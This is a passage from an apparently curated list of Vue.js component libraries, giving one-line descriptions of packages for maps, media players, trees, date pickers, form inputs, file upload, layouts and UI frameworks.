for Vue2. Uses dayjs.\nvuelendar - Simple and clean calendar written in VueJS\n\nMap\n\nvue2-google-maps - Google maps component for vue with 2-way data binding.\nvue2-leaflet - Vue 2 components for Leaflet maps.\nvue-mapbox-gl - Vue 2.x component for Mapbox GL JS\nvue-yandex-maps - Vue 2.x component for Yandex Maps\nvue-baidu-map - Vue 2.x component for Baidu Maps.\nvue-choropleth - Vue 2.x component to display a choropleth map.\nvuelayers - Vue 2 components to work with OpenLayers.\nvue-googlemaps - Vue 2.x components to integrate Google Maps.\nvue-static-map - Vue 2.x simple component to generate an static google map\nvue-mapbox - Vue 2.x wrapper around Mapbox GL JS library that provides vueish-way to interact with the map.\n\nAudio / Video\n\nVue-APlayer - \ud83c\udf70 Easy-to-config music player for Vue 2.x.\nvue-audio - audio-tag wrapper; sound player component for Vue 2.x\nvue-dplayer - A Vue 2.x video player component based on DPlayer.\nvue-canvasvideo - A Vue 2.x component for video backgrounds and autoplay video on iOS/Safari.\nvue-music - A Vue component base on html5 <audio>.\nvue-audio-visual - Vue HTML5 audio visualization components.\nvue-plyr - A set of Vue components for the plyr video & audio player.\nv-playback - A Vue2 plugin to make video play easier.\nvue-audio-recorder - Audio recorder for Vue.js. It allows to create, play, download and store records on a server\n\nInfinite Scroll\n\nvue-infinite-loading - An infinite scroll plugin for Vue.js 1.0 & Vue.js 2.0.\nvue-mugen-scroll - Infinite scroll component for Vue.js 2.\nvue-infinite-scroll - An infinite scroll directive for vue.js.\nvue-loop - An infinite content loop component for Vue.js 2.\nvue-scroller - An infinite content loop component for Vue.js 2, including functionalities such as 'pull-to-refresh', 'infinite-loading', 'snaping-scroll'.\nvue-infinite-list - An infinite list mixin can recycle dom for Vue.js 2\nvue-infinite-slide-bar - \u221e Infinite slide bar component.\nvue-virtual-infinite-scroll - A vue2 component based on Iscroll, supports big data list with high performance scroll, infinite load and pull refresh.\n\nPull-to-refresh\n\nvue-pull-refresh - A pull to refresh component for Vue.js 2.0.\nvue-pull-to - A pull-down refresh and pull-up load more and infinite scroll for Vue.js component.\nvue-data-loading - Another component for infinite scroll and pull down/up to load data.\nvue-quick-loadmore - A pull-down refresh and pull-up infinite scroll plugin for Vue.\n\nMarkdown\n\nvue-markdown - A Powerful and Highspeed Markdown Parser for Vue.\nvue-mavonEditor - A markdown editor based on Vue that supports a variety of personalized features.\nvue-simple-markdown - A Simple and Highspeed Markdown Parser for Vue.\nvue-simplemde - A wrapper around simplemde. Delightful editing for beginners and experts alike. Features built-in autosaving and spell checking.\ntoast-ui.vue-editor - Vue Wrapper for TOAST UI Editor.\n\nPDF\n\nvue-pdf - A pdf viewer based on mozilla's PDF.js\npdfvuer - A PDF viewer for Vue using Mozilla's PDF.js with text support. Demo\n\nTree\n\nVue.D3.tree - A Tree View based on D3.js\nvue-json-tree-view - A JSON Tree View Component for Vue.js.\nvue-tree - A Tree Component for Vue.js 2.X.\nliquor-tree - Amazing Vue Tree component\nvue-trees-ui - A Tree Ui Base On Vue.\nBosket - Collection of tree view components for front-end frameworks (Vue, React, Angular and Riot).\nplantain-00/tree-component - A reactjs, angular and vuejs tree component.\nsl-vue-tree - A simple customizable draggable tree component for Vue.js\nvue-draggable-nested-tree - A powerful customizable draggable tree view component for Vuejs2 @phphe\nvuejs-tree - A highly customizable VueJs tree viewer\nvue-jstree - A Tree Plugin For Vue2 with beautiful icons and drag&drop\nvue-vtree - Universal and flexible tree component for Vue.js\nvue-json-component - JSON tree view with no dependencies, TypeScript support, and easy customization.\nvue-tree-list - A vue component for tree structure\n\nSocial Sharing\n\nvue-social-sharing - A Vue.js component for sharing links to social networks, work with Vue.js 1.X or 2.X.\nvue-goodshare - Vue.js component for social share with beautiful button design. Simple install, extensive documentation, developer support, SEO friendly, clean code without scripts tracking user activity on the page, high speed. Work with Vue.js 2.x.\nvue-socialmedia-share - A Vue.js component for sharing links to social networks, with Vue 2.X\nvue-picture-sharesheet - A Vue Picture Sharesheet Component heavily inspired by the Image Sharesheet in Apple's Newsroom\nvue-twitter - A Vue.js component for embed twitter widgets (e.g timeline, buttons)\nvue-share-buttons - Vue.js component for placing buttons in your project using which you can share anything\n\nQR Code\n\nvue-qriously - A Vue.js 2 component to draw QR codes on an HTML Canvas using qrious.\nvue-qart - The directive of vue 2.x for qart.js.\nvue-qrcode-reader - A Vue.js 2 component which detects and decodes QR codes from a camera stream.\n\nSearch\n\nvue-fuse - A lightweight plugin for fuzzy search library, Fuse.js\nvue-instantsearch - The ultimate toolbox for creating instant-search experiences using Algolia.\nvue-innersearch - A Vue.js wrapper for Elasticsearch\nreactivesearch-vue - UI components for building data-driven apps with Elasticsearch\n\nMiscellaneous\n\nvue-avatar - An avatar component for vue.js.\nvue-touch-ripple - Touch ripple component for Vue.js(1.x ~ 2.x).\nvue-typer - Vue component that simulates a user typing, selecting, and erasing text.\nvue-keyboard - Vue 2 virtual keyboard component.\nvue-twentytwenty - Image comparison component, works with Vue.js 2.x\nvue-cookie-law - Cookie info plugin for Vue.js 2.x\nvue-gravatar - A dead-simple gravatar component for Vue.js 2.x\nvue-clipboard2 - An easy to use clipboard.js binding for Vue.js 2.x\nvue-flashcard - FLashcard component with animation for Vue.js 2.x \ud83d\udca1\nvue-truncate-collapsed - A simple component that truncates your text and adds a 'Read More/Show Less' clickable for Vue.js 2.x\nvue-kanban - A flexible drag and drop kanban board component\nvue-letter-avatar - A simple and elegant letter avatar component for vue.js\nvue-highlightjs - Syntax highlighting with highlight.js\nv-clipboard - Simple, tiny and easy to use directive to save your models to clipboard (less than 2kb minified, no dependencies)\nvue-invisible-recaptcha - Super easy integration for Google's Invisible reCAPTCHA\nvue-embed - Embed component is based on embed.js for Vue 2.x, a component that embeds emojis, media, maps, tweets, gists, code, services and markdown.\nvue-particles - Vue.js component for particles backgrounds\nvue-uniq-ids - Vue.js 2.x plugin that helps to use id-related attributes with no side-effect\nvue-multivue - Use multiple vue apps of the same class on the same page.\nvue-affix - A Vue.js 2.x plugin that affixes an element in the window while you scroll, similar to Bootstrap Affix but much simpler and smarter\nX-Browser-Update-Vue - A Vue.js browser-update plugin.\nvue-query-builder - A UI component for building complex queries with nested conditionals.\nvue-info-card - A simple and beautiful card component with an elegant spark line and CSS3 flip animation.\nv-offline - Simple, tiny and easy to use detection of offline & online events for your Vue app (less than 390b minified)\nvue-word-cloud - A word cloud generator.\nvue-flat-surface-shader - A Vue component for flat surface shader\nvue-easteregg - Easey add an easteregg to your vue app (default with konami code)\nvue-barcode-scanner\nvue-heatmapjs - A Vue directive for tracking and visualising mouse activity\nvue-maze - An itty-bitty maze game made as Vue.js component\nvue-drag-verify - This is a vue component, which is sliding to unlock for login or sign up.\nvue-balloon - Vue components for creating fixed, zoomable containers in the corner of a page. Similar to the mail composition wrapper used in gmail.\nvue-sticker - Sticker effect to any directions\nv-rating - \u2b50\ufe0f Rating component in Semantic-UI made with VueJS (< 500B gzipped, blazing fast)\nvue-content-placeholders -  Composable components for rendering fake (progressive) content like facebook in vue\nvue-page-designer - Vue component for drag-and-drop to design and build mobile website.\nvue-creativecommons - CreativeCommons.org Vue.js components library.\nvue-status-indicator - A Vue.js component to show status indicator as colored dots.\nvue-google-adsense - Vue.js Google Adsense Component with InFeed and InArticle Ads support\nemoji-vue - Emoji \ud83d\ude0e\ud83d\udc4c\ud83c\udffb dropdown for Vue.js project\nvue-chessboard -  Chessboard vue component to load positions, create positions and see threats.\nvue-mindmap - Vue component for mindnode maps.\nv-currency - Vue component for formatting currency.\nvue-emoji-picker - Highly customizable unicode emoji picker \ud83d\udd25\ud83d\ude80\nvue-8-puzzle - An itty-bitty slide puzzle game made as Vue.js component\nvue-e164 - Customizable phone formatter with E.164 standart support\nvue-pgn - Vue.js component for viewing chess games in pgn format\nvue-avatar-editor - Resize, rotate and crop your uploaded avatar using a clear user interface.\nvue-connection-listener - Vue event bus plugin listening for online/offline changes.\nvue-sauce - \"View source\" directive for Vue.\nvue-prom - Vue promise wrapper component.\nnumeric-keyboard - Numeric keyboard for mobile browsers.\nvue-zoom-on-hover - Image zoom on mouse hover\nvue-responsive-image - A Vue component that lets you quickly create responsive image tags with an optimal number of image sources for all devices.\nvue-highlight-text - Vue component for highlight multiple instances of a word\nvue-cast-props - Provides a convenient way of converting props to common data types.\nvue2-heropatterns - A Vue2 implementation allowing you to add the popular Hero Patterns onto any Div\nvue-link - One component to link them all \ud83d\udd17 (treat external and internal links same)\nvue-identify-network - \u26a1\ufe0fIdentify what kinda internet your users are using!\nvue-cloneya - A vue component to clone DOM elements\nvue-survey-builder - Survey builder for vue.js applications\nvue-if-bot - A lightweight component to hide/show content to clients based on the user agent\nvue-clampy - Vue.js (2+) directive that clamps the content of an element by adding an ellipsis to it if the content inside is too long.\nvue-cookie-accept-decline - Show a banner with text, a decline button, and an accept button on your page. Remembers selection using cookies. Emits an event with current selection on creation. Good for GDPR requirements.\n@lossendae/vue-avatar - An avatar component for VueJS 2.0.\nvue-text-highlight - Text highlighter library for Vue.js \ud83d\udc84\nvue2-hammer Hammer.js wrapper for Vue 2.x to support mobile touch..\nvue-countable - Vue binding for countable.js. Provides real-time paragraph, sentence, word, and character counting.\nv-show-slide - A Vue.js directive for animating an element to and from height: auto in a sliding motion.\nvue-swipe-actions - iOS style swipe actions for Vue.js\nvue-friendly-iframe - A Vue js component for creating super fast loading, non-blocking iframes.\nvue-beautiful-chat - A simple and beautiful Vue chat component backend agnostic, fully customizable and extendable.\nvue-magnifier - A simple image zooming / magnifying component for Vue.js 2.x.\nvue-highlight-words - Vue component to highlight words within a larger body of text. Ported from react-highlight-words\nvue-tags-ball - Create a beautiful and spherical tag with this plugin\nvue-rippler - Simple Vue.js plugin for custom ripple effect\nvue-contacts - Mobile contacts component for Vue\nbasic-vue-chat - Easy to use Vue.js chat\nvue-resize-text - A vue directive which automatically resize font size based on element width.\nvue-github-profile - A vue component to view the profile and repos of determined user\nvue-niege - \ud83c\udf84 \ud83c\udf85 Single File Vue component to add a snow storm through a canvas.\nvue-dynamic-star-rating - A highly dynamic vue stars rating component, like google play rating \u2b50\ufe0f \u2b50\ufe0f \u2b50\ufe0f \u2b50\ufe0f \u2b50\ufe0f\nvue-katex - Simple plugin for math typsetting using KaTeX in Vue.js\nvue-canvas-identify - Vue canvas component for vuc-identify\nvue-canvas-material - Vue canvas component for vuc-material\nvue-baberrage - A simple Barrage plugin Base on Vue.js\ud83d\ude0e\nvue-terminal-ui - \ud83d\udda5Terminal UI emulator Vue: custom and basic commands\nvue-command - A fully working Vue.js terminal emulator\nvue-ribbon - Vue component for GitHub ribbons\navatio-avatar - Vue component for illustrated avatars - used by Avatio\nvue-jazzicon - A dead-simple Jazzicon component for Vue.\nvue-star-rating - A simple, highly customisable star rating component \u2b50\ufe0f \u2b50\ufe0f \u2b50\ufe0f\nvue-fixed-header\nSimple and cross-browser friendly fixed header component for Vue.js written by TypeScript.\n\nTabs\n\nvue-tabs - Simple tabs and pills.\nvue-swipe-tabs - A touch swipe tab component for vue.js(vue2).\nvue-tabs-component - An easy way to display tabs with Vue.\nvue-k-tabs - A simple tabs components with Gitlab design.\nvue-tabs-with-active-line - Simple Vue 2 component, that allows you to make tabs with moving bottom line\n\nForm\nLet the user create & edit data\nPhone Number Input Formatter\n\nvue-phone-number-input - A beautiful input to format & valid phone number with country code \ud83d\udd25\n\nPicker\n\nvue-smooth-picker - A smooth picker component for Vue 2.x, like iOS native datetime picker.\n\nGenerator\n\nFormSchema Native - Generate a form using JSON Schema and Vue.js\nvue-awesome-form - A vue.js component just like json-editor\nvue-generator - Initial router and components for the Vue project.\nvue-form-json - Generate a vue form with validation and bulma style, from json\nform-create - Form builder with dynamic rendering, data collection, validation, and submission capabilities, supporting json data\nelement-form-builder - Build element-ui forms with JSON Schema.\nncform - a very nice configuration generation way to develop form\n\nDate Picker\nDate / datetime / time Picker\n\nvue-datepicker - [unmaintained] Calendar and datepicker component with material design for Vue.js.\nvue2-timepicker - [unmaintained] A dropdown time picker (hour|minute|second) for Vue 2.x, with flexible time format support.\nvuejs-datepicker - A simple Vue.js datepicker component. Supports disabling of dates, inline mode, translations.\nvuedt - [unmaintained] Crazy lightweight (5.5kb!) Vuejs Date and Time picker component with nice animations and not too much fuzz.\nvue-flatpickr-component Vue.js component for flatpickr datetime picker\nvue-bootstrap-datetimepicker Vue.js component for eonasdan-bootstrap-datetimepicker\nvue-jalaali-datepicker - Jalaali calendar and datepicker for vue.js 2.\nvue-date-picker - A vue date picker component inspired by material design\nvue-monthly-picker - Vue.js component for month and year picker only\nvue-hotel-datepicker - A responsive date range picker that displays the number of nights selected, allows custom check-in/check-out rules, blocking dates, localization support and more.\nvue2-persian-datepicker - An awesome Persian datepicker component for vue. \u06a9\u0627\u0645\u067e\u0648\u0646\u0646\u062a \u0627\u0646\u062a\u062e\u0627\u0628 \u062a\u0627\u0631\u06cc\u062e \u0628\u0631\u0627\u06cc \u0648\u06cc\u0648.\nvue-datetime - Mobile friendly datetime picker for Vue. Supports date, datetime and time modes, i18n and disabling dates.\nvue-rangedate-picker - Range date picker with simple usage\nv2-datepicker - A simple datepicker component based Vue 2.x.\nvue-datepicker-local - A Beautiful Datepicker Component For Vue2.\nvue-airbnb-style-datepicker - A Vue datepicker with a similar look and functionality as the popular AirBnb datepicker. Lightweight, configurable and good browser support!\nvue-persian-datetime-picker Persian material datepicker. Supports datetime, date, time, year, month.\nVCalendar Very customizable and powerful calendar/datepicker component with many features and good documentation.\n@owumaro/vue-date-range-picker - A vue component using Bootstrap 4 styles for date range selection\nvue-datepicker-mobile - A mobile friendly datepicker for vue2. \ud83c\udde8\ud83c\uddf3 select one day or range of date and custom it that you wish.\nvue-draggable-cal - Not your ordinary datepicker. A Vuejs draggable date selector with a fresh responsive design, mobile ready and 0 dependencies, 17kb gzipped.\nvue-vanilla-datetime-picker - Datetime picker for Vue.\nvue2-daterange-picker - Vue2 date range picker based on bootstrap-daterangepicker (no jQuery dependency)\nvue-timeselector - Fully and simply customizable powerful time picker component for Vue.js.\nvue-date-picker - Lightweight datepicker component for Vue 2.x.\nvue-ctk-date-time-picker - A beautiful VueJS component to pick date & time (with range mode) \ud83c\udd95\n\nSelect\n\nvue-select - A native Vue.js component that provides similar functionality to Select2 without the overhead of jQuery.\nvue-multiselect - Universal select/multiselect/tagging component for Vue.js.\nstf-vue-select - most flexible and customized select Vue2\nvue-select-image - Vue 2 Component for selecting image from list\n@riophae/vue-treeselect - A multi-select component with nested options support for Vue.js.\n@k186/pd-select - A mobile UI component like IOS picker for Vue 2.x,can be wheel pick what ever you defined.\nvue-dropdowns - A minimalistic and adaptable way to display select boxes if using objects for vue2.x\nv-cascade - A lovely component of cascade selector with Vue 2.x (Support both of PC and Mobile)\nvue-multi-select - A custom component to make select/multiselect for Vue2.\nv-region - A simple region selector, provide Chinese administrative division data.\nv-selectpage - A powerful selector for Vue2, list or table view of pagination, use tags for multiple selection, i18n and server side resources supports.\nvue-cool-select - Bootstrap / Material Design theme, support slots, autocomplete, events, validation and more.\n@myena/advanced-select - Single/Multiple Select component with search, controls for (de)select all and a Bootstrap 3 theme\n@alfsnd/vue-bootstrap-select - Vue version of bootstrap-select.\n\nSlider\n\nvue-slider-component - Slider for vue1.x and vue2.x.\nvue-circle-slider - Circle slider component for vue2.x.\nvue-netflix-slider - A Netflix like slider.\nvue-slide-bar - Very simple vue slider bar component.\ntextra - Vue js add-on to slide text.\nvue-knob-control - A rotary knob control for Vue.js\n\nDrag and Drop\n\nvuedraggable - Vue component allowing drag-and-drop sorting in sync with View-Model. Based on Sortable.js.\nvue-dragula - Drag and drop so simple it hurts.\nvue2-dragula - A vue-dragula fork for Vue2, with a lot of improvements.\nawe-dnd - A sortable list directive with Vue.\nvue-draggable-resizable - Vue2 component for draggable and resizable elements.\nvddl - Vue components for modifying lists with the HTML5 drag & drop API, supports VueJs versions 1 and 2.\nvue-drag-drop - A minimal and lightweight wrapper for the HTML5 Drag and Drop API.\nvue-swing - A swipeable cards interface, as seen in apps like Jelly and Tinder.\nvue-slicksort - A dependency-free set of mixins for animated, touch-friendly, sortable lists\ndraggable-vue-directive - A simple directive to handle drag and drop of any Vue component.\nvue-smooth-dnd - Vue wrappers of smooth-dnd library. drag and drop, sortable library covering for many cases.\nvue-drag-resize - A dependency-free Vue component for draggable and resizable elements with aspect ratio, reactive props etc\nvue-drag-it-dude - Vue2 component, that allows you to drag object wherever you want.\nvue-draggable - Vue Drag and Drop library without any dependency. Simple and easy to use.\nvue-nestable - A simple drag & drop hierarchical list made as a vue component.\nvue-draggable-nested-tree - A powerful customizable draggable tree view component for Vuejs2 @phphe\n\nAutocomplete\nAutosuggest / autocomplete / typeahead\n\nvue-instant - Vue instant allows you to easily create custom search controls with auto suggestions for your vue 2 applications.\nv-autocomplete - Autocomplete component for Vue.js\nvue-awesomplete - Vue wrapper for Awesomplete\nvue-auto-complete - Autocomplete for Vue2. Works with objects or api calls.\nvue-autosuggest - WAI-ARIA complete Autosuggest component with full customization over rendering and styling.\nv-autosuggest - A simple modular Vuejs component that autosuggest input from a dynamic or static data querying.\nautocomplete - Simple Autocomplete component for Vue.js 2.*\nvue-infinite-autocomplete - Vue infinite-autocomplete wrapper for Vue.js 2.*\nvue-simple-suggest - Simple yet feature-rich autocomplete component for Vue.js\nv-suggest - A Vue2 plugin for input content suggestions, support keyboard to quick pick.\nvue-bootstrap-typeahead - An typeahead/autocomplete component for Vue2 using Bootstrap 4 CSS.\n\nType Select\nLet the user select a tag / something while typing\n\nvue-input-tag - Vue.js 2.0 Input Tag Component.\nv-distpicker A flexible, highly available district picker for picking provinces, cities and districts of China for Vue.js 2.x.\nvue-img-inputer A graceful, highly customizable img type input for Vue 2\nvue-img-preview An image input preview component in vue 2\nv-image \ud83d\udcf7 Tiny little component for input type=file (< 1kb, gzipped)\n@voerro/vue-tagsinput A simple tags input Vue.js 2 component with typeahead/autocomplete\nvue-tag-selector - Tag-like input. Light, customizable and handles REGEX validation!\n\nColor Picker\n\nvue-color - Vue Color Pickers for Sketch, Photoshop, Chrome & more.\nvue-swatches - Help the user picking beautiful colors!\nradial-color-picker - Minimalistic color picker with a focus on size, accessibility and performance.\nvue-color-picker-board - Vue Color Picker component designed for humans!\nverte - A Complete Vue.js Color Picker Component.\n\nSwitch\nSwitch / on/off toggle / checkbox\n\nvue-switches - An on/off switch component for Vue.js with theme support.\nvue-js-toggle-button - Vue.js 2.0+ toggle / switch button - simple, pretty, customizable.\nvue-checkbox-radio - A Vue component to easily styling checkbox and radio inputs.\nvue-enhanced-check - Vue component to redesign/labelize checkbox/radio, including toggle/switch button.\npretty-checkbox-vue - Implementation of pretty checkbox 3(A pure CSS library to beautify checkbox and radio buttons) components for Vue.js 2.2+.\nvue2-collapse - Vue Collapse is a flexible content toggling plugin for the accordion lists or any other conditional content rendering.\nvue-badger-accordion - A wrapping Component for Badger Accordion for Vue.js 2.0+\nvue-loading-checkbox - A highly customizable Vue.js checkbox UI component with loading state\nvue-rocker-switch - A customizable rocker switch component for Vue.js.\n\nMasked Input\n\nvue-masked-input - Masked input component for Vue.js.\nvue-text-mask - Input mask for React, Angular, Ember, Vue, & plain JavaScript.\nvue-ip-input - An ip input implemented by vuejs.\nvue-numeric - Input field component to display currency value based on Vue.\nawesome-mask - Mask directive based on a pure and simply VanillaJS implementation\nv-money - Tiny (<2k gzipped) input/directive mask for currency\nvue-autonumeric - A Vue.js component that wraps the awesome AutoNumeric input formatter library\nvue-inputmask - Vue.js directive to add Robin Herbots' inputmask library to your inputs (vanilla javascript).\nvue-input-number - A custom input number component for Vue.js 2.\nv-unicode - Vue directive to restrict an input by unicode values.\nvue-cleave-component - Vue.js component for cleave.js\nvue-ip - An ip address input with port and material design support\nvue-r-mask - Directive with template similar to javascript regular expression.\nvue-input-code - Base on Vue.js 2.0+ verification code input component.\nlabel-edit - Inspired by Trello. Click to show editable input and return the value changes. This is a Vue Component.\nvue-jquery-mask - Vue.js v2.x component for jQuery Mask Plugin\nvue-the-mask - Tiny (<2k gzipped) and dependency free mask input for Vue.js\nvue-canvas-input - Vue canvas component for vuc-input\nvue-currency-input - Easy input of currency formatted numbers for Vue.js.\n\nRich Text Editing\n\nvue-quill-editor - Quill editor component for Vue2.\nvue-mobiledoc-editor - A mobiledoc editor component toolkit for Vuejs.\nvue2-medium-editor - A MediumEditor component for Vue 2.\nvue-froala - VueJS wrapper for Froala Editor.\nvue-froala-wysiwyg - Official VueJS plugin for Froala WYSIWIG HTML Editor.\nvue-at - At.js for Vue.\nvue-wysiwyg Lightweight, fast & extensible WYSIWYG editor\nvue-trumbowyg Vue.js component for Trumbowyg WYSIWYG editor\nvue-pell-editor Vue.js component for Pell WYSIWYG editor\nvue-tinymce-editor Tinymce editor component for Vue2.\nvue-mce - tinymce editor component for VueJS.\nVue2-Editor - HTML Editor using Vue.js and Quilljs\nvue-codemirror - A Codemirror component for Vue2.\nvue-easy-tinymce - A simple and powerful package for easy usage of tinymce in Vue.js project.\nvue-highlightable-input - Highlight and style text as you're typing\nvue-trix - Simple and lightweight Trix rich-text editor for Vue.js\ntiptap - A renderless and extendable rich-text editor for Vue.js\ntoast-ui.vue-editor - Vue Wrapper for TOAST UI Editor.\nckeditor5-vue - An official CKEditor 5 rich text editor component for Vue.js.\nyimo-vue-editor - A wangEditor2 component for Vue2.\nvue-mathlive A MathLive math editor (mathfield) for Vue.hjs\n\nImage Manipulation\nEdit images\n\nvue-core-image-upload - A vue plugin for image to crop and upload.\nvue-croppa - A simple straightforward customizable lightweight mobile-friendly image cropper for Vue 2.0.\nvue-cropper - A picture clipping plugin for vue2.0\ntoast-ui.vue-image-editor - Vue Wrapper for TOAST UI Image Editor.\nvue-quick-cropper - Vue mobile avatar upload cropping plugin can choose cropping area and zoom.\nvue-canvas-image - Vue canvas component for vuc-image\n\nDisplay images\n\nvue-cloudinary - A vue (2.0) plugin that offers a reusable directive to get images from Cloudinary (https://cloudinary.com) with dynamic manipulation (resizing/cropping/effects/watermarking/scaling/formatting) and optimization (webp/png/auto quality/auto retina).\nimg-Vuer - An Mobile-First image viewer/gallery for Vue2\nvue-image-loader - A vue loader/progressive image plugin like Medium.\nvue-load-image - display loader during image loading, as well as by display alternate content when the image fails to load.\n\nVideo Manipulation\n\nvue-playlist - A lightweight vue (2.0) component with no dependancies that offers truly seamless html5 video playback. The one and only working solution for seamless video play done with vanilla JS. It takes an array of videos and stitches them together into a single video.\n\nFile Upload\n\nvue-clip - Simple and hackable file uploader for VueJs. Supports Vue >= 2.1.\nvue-simple-upload - Simple File upload component for Vue.js.\nvue2-multi-uploader - A drag and drop multiple file uploader component that uses Vue.js v2 and Axios. Uploader shows file names, sizes and total size of files added. It also allows setting a minimum required number of files to upload.\nvue-dropzone - A Vue.js (vue2) component for Dropzone.js - a drag\u2019n\u2019drop file uploads utility with image previews.\nvue-transmit - A purely Vue.js drag & drop uploader component based on Dropzone.js for Vue 2.0\nvue-upload-component - Vue upload component, Multi-file upload, Upload directory, Drag upload, Drag the directory. Supports  Vue >= 2.0\nvue-uploader - A Vue.js upload component powered by simple-uploader.js\nic-firebase-uploader - A clean multi-file upload component for Firebase storage.\nvuejs-uploader - A resumable multipart file uploader for HUGE file uploads.\nvue-filepond - A Vue.js component for FilePond - a file upload library that can upload anything you throw at it.\nv-uploader - A Vue2 plugin to make files upload simple and easier, you can drag files or select file in dialog to upload\n\nContext Menu\n\nvue-context-menu - A context menu component for vue js.\nvue-lil-context-menu - A flexible lil context menu component for Vue.\nvue-mouse-menu - A mouse-menu component for vue 2+.\n@hscmap/vue-menu - Menu / Context Menu component for vue2.\nvue-context - A simple but flexible context menu for vue js.\nvue-simple-context-menu - Simple context-menu component built for Vue. Works well with both left and right clicks.\nvue-context-menu-popup - Context Menu popup for Vue 2. Works on right click or can be triggered programatically.\n\nMiscellaneous\n\nvue-gmaps - Search places and address using Google Maps API.\nvuep - A component for rendering Vue components with live editor and preview.\nvue-places - Places component is based on places.js for Vue 2.x. Turn any input into an address autocomplete.\nvue-password-strength-meter - Password strength meter based on zxcvbn in vue.js.\nvue-float-label - Float label pattern for Vue.js.\nvue-longpress - A VueJS (2.x) button component that requires you to keep pressing to confirm a given action.\nvue-google-autocomplete - A Vue.js (2.x) autosuggest component for the Google Maps Places API.\nvue-ip-input - An ip input component for Vue.js 2.x\nvue-default-value - Vue.js 2.x directive to set a default value for editable elements with no affect to the model state\nvue-model-autoset - A Vue.js plugin to workaround Vue limitation in observing dynamically added properties with v-model directive\nvue-submit - Simple implementation of Ladda (1, 2) in less than 90 lines of code with no dependencies.\nvue-rate - Rate component for Vue\nvuetify-google-autocomplete - A Vuetify ready Vue.js (2.x) autosuggest component for the Google Maps Places API.\nvue-ripple-directive - Material Ripple Effect as Vue Directive.\nvue-fab - Vue Floating Action Button.\nvue-complexify - Vuejs porting library from jquery.complexify.js.\nvue-mc - Models and Collections for Vue.js\nvue-stars - Highly customizable rating control (using stars or other characters)\nvue-confirmation-button - Customizable confirmation button that requires users to read messages before performing an action\nvue-poll - A Vue.js component for voting\nvue-diagrams - Diagram component for vue.js, inspired by react-diagrams\nvue-easy-polls - A Vue.js component for creating polls, voting and showing results. It\u2019s easy to implement and easy to customize.\nvue-m-button - A beautiful button component for vue.\nvue-long-click - Long click (long press) directive library for vue, support mobile and desktop.\nvue-ui-predicate - A rules editor, generic filtering UI, predicates component for Vue JS.\nvue-mobile-detection - Vue.js prototype function this.$isMobile() that returns a Boolean value depending on whether or not the user is browsing with a mobile.\n\nWizard\n\nvue-form-wizard - Tab based component which can replace classic bootstrap & jQuery form wizards\nvue-stepper - A simple stepper with simple actions such as next, back and end to perform simple forms.\nvue-stepper-component - A fully customizable Stepper component with Vuex support and Zero dependencies.\n\nCSV\n\nvuecsv - A Simple CSV Downloader from json with option modal panel component.\n\nComment System\n\nvue-comment-grid - \ud83d\udcac Responsive Vue.js comment system plugin that built with CSS Grid and Firebase REST API + Authentication.\n\nCanvas\n\nvue-easeljs - Data-driven control over an HTML5 canvas element.\nvue-canvas-effect - A simple, canvas effect collection for Vue.js.\nvue-konva - Vue & Canvas - JavaScript library for drawing complex canvas graphics using Vue.\nvue-html2canvas - Vue mixin to capture html and convert it to an image using Html2Canvas.\nvue-canvas-nest - A Vue.js component for canvas-nest.\nvue-signature-pad - \ud83d\udd8b A Vue Signature Pad Component\n\nLink Preview\n\nlink-prevue - Flexible component for generate a link preview.\n\nTour\n\nvue-tour - Lightweight and customizable tour plugin\nvue-page-guide - Page tour / guide plugin with directive\n\nUI Layout\nLayout for the overall / main view\n\nvue-waterfall - A waterfall layout component for Vue.js.\nvueisotope - Vue component for isotope filter & sort magical layouts.\nvue-grid-layout - A draggable and resizable grid layout, for Vue.js.\nvue-drag-zone - Drag Zone component for Vue.js(2.x).\nvue-masonry - Vue.js directive for masonry blocks layouting.\nvue-fraction-grid - Flexbox based responsive fraction grid system for Vue.js.\nvue-virtual-scroll-list - A vue (2.x) component support big data by using virtual scroll list.\nvue-virtual-scroller - Component to scroll a large amount of elements efficiently (Vue 2.x).\nvue-virtualscroll - [Vue 2.x] component to virtual scroll things.\nvue-inview - [Vue 2.x] Viewport, get notification when DOM element is entered or leave.\ndnd-grid - A vuejs grid with draggable and resizable boxes\nvue-extend-layout - Extend the default layout or create custom layouts for the pages of your Vue.js SPA\nvue-masonry-css - Vue.js Masonry layout component powered by CSS, dependency free\nvue-fullpage.js - Official fullPage.js component for Vue.js.\nvue-virtual-collection - Vue component for efficiently rendering large collection data.\nautoresponsive-vue - Auto responsive grid layout library for Vue.\nVueFlex - A flexbox grid system.\nv-chacheli - A Vue.js component to create and display custom dashboard-like grid layouts.\nvue-grid-styled - A lightweight set of functional grid components, ported from React's grid-styled\nsimple-grid - Vue component for grid layout,support flex.\nvue-container-component - Simple container component inspired on Bootstrap Container\nvue-colcade - A small wrapper for integrating Colcade grid layout to Vuejs.\nvue-ads-layout - A small library of Vue components to quickly generate a responsive web application layout with toolbar, left/right drawers and a footer. All components can be positioned fixed or relative.\nvue-magic-grid - A tiny port of Magic Grid for Vue.js 2.\nvue-splitter-pane - A Vuejs component which renders two slots in a adjustable split arrangement (vetical or horizontal).\nsplitpanes - A Vue JS reliable, simple and touch-ready panes splitter / resizer.\nvue-mock-layout - Easily mock the layout of your Vue apps.\n\nFrameworks\nResponsive\nSet of components + responsive layout system\n\nquasar-framework - Quasar Framework. Build responsive websites, hybrid mobile Apps (that look native on Android and iOS) and Electron apps using same code, with VueJs 2.\nvue-material - Material design for Vue.js.\nvuetify - Material Component Framework for Vue.js 2.\nmuse-ui - Material Component library for Vue.js 2.\nbuefy - Components based on Bulma framework.\nelement-ui - A Vue.js 2.0 UI Toolkit for Web.\nvue-bulma-components - Easily use bulma class syntax with vue components.\niview-ui - A Vue.js 2.0 UI Framework for web.\nAT-UI - A fresh and flat UI-Kit specially for desktop application, made with \u2665 by Vue.js 2.0\nv-semantic - Implementation of semantic-ui for Vue\nbootstrap-vue - Implementation of bootstrap-4 grid and components for Vue.js 2.\nfish-ui - A Vue.js 2.0 UI Toolkit for Web\nzircle-ui - A frontend library to develop zoomable user interfaces.\nvue-mdc-adapter - Material Components integration for Vue.js as per MDC Team's guidelines.\nMaterial Components Vue - wrapper around material-components-web for Vue.js\nVueFace - A Vue.js 2.0 UI Component library for Web\nvuesax - Frontend vue Components for Vue.js.\nvuecidity - UI component framework for Vue.js 2.0\nant-design-vue - An enterprise-class UI components based on Ant Design and Vue 2.5.0\nheyui - (https://www.heyui.top/en) - A Vue.js 2.0 UI Toolkit for Web.\nCarvue.js - IBM's Carbon Design System for Vue.js\nBalmUI - Next Generation Material UI for Vue.js\nOsiris UI - \ud83c\udfa8 A Vue.js 2.0 